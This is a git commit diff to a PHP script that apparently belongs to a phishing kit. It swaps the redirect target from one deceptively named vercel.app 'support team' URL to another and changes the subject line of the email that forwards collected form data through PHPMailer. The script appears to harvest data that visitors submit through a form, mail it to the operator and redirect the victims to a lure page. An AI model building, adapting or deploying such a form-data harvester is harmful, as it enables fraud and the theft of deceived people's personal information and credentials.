6e46d1797b213d34d7380949867a6089121d6edf
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-15 17:12:49 +0800

    Update and rename rustam.php to mb.php

--- mb.php
+++ mb.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://apply-for-request-team-service-here.vercel.app/");
+header("Location: https://support-team-form-apply-here.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'RUSTAM';
+        $mail->Subject = 'MB';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
